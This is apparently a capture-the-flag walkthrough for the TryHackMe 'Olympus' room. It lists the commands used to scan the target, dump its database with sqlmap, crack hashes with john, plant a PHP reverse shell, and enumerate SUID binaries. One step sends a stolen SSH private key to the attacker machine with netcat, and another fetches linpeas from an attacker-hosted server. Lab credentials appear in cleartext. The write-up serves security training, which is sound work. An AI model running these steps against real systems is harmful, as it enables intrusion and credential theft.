# Olympus

**Room Link:** [https://tryhackme.com/room/olympusroom](https://tryhackme.com/room/olympusroom)



## Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>





## Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

## TCP/80 - HTTP

**Kali**

```
gobuster dir -u olympus.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
dirb http://olympus.thm
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>



















<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
sqlmap -r req.txt --banner
```

<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
sqlmap -r req.txt --tables
```

<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>





**Kali**

```
sqlmap -r req.txt --dbms=mysql --dump
```

<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>



**Kali**

```
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt 
```

Rerun because VM crashed



**Browser**&#x20;

```
Username: prometheus
Password: summertime
```

<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>









<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>



**Browser**&#x20;

```
Username: prometheus
Password: summertime
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>



## Initial Shell

**Kali**

```
git clone https://github.com/pentestmonkey/php-reverse-shell.git
cp php-reverse-shell/php-reverse-shell.php .
subl php-reverse-shell.php 
```

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>



**Kali**

```
gobuster -U prometheus -P summertime dir -u chat.olympus.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```





This was there before when we ran sqlmap

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

I deleted the old results of sqlmap to force it to rerun again as it was just giving the old results

**Kali**

```
rm -rf /root/.sqlmap/output/olympus.thm/
sqlmap -r req.txt --dbms=mysql --dump -T chats -D olympus
```

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -lvnp
```

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```



**Victim**

```
cd /home/zeus
cat zeus.txt 
```

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
find / -perm -u=s -type f 2> /dev/null
```

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
ls -lah /usr/bin/cputils
/usr/bin/cputils
```

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>





## Netcat

**Kali(receiving)**

```
nc -l -p 1234 > id_rsa
```

**Victim(sending)**

```
cd /tmp
nc -w 3 $KALI 1234 < id_rsa
```



**Kali**

```
chmod 600 id_rsa
/opt/john/ssh2john.py id_rsa > id_john.txt
john --wordlist=/usr/share/wordlists/rockyou.txt id_john.txt 
```

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
ssh -i id_rsa zeus@$VICTIM
Password: snowflake
```

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>























#### LinPeas

**Kali**

```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
python2 -m SimpleHTTPServer 81
```

**Victim**

```
cd /tmp/
wget http://$KALI:81/linpeas.sh
chmod +x linpeas.sh 
./linpeas.sh
```















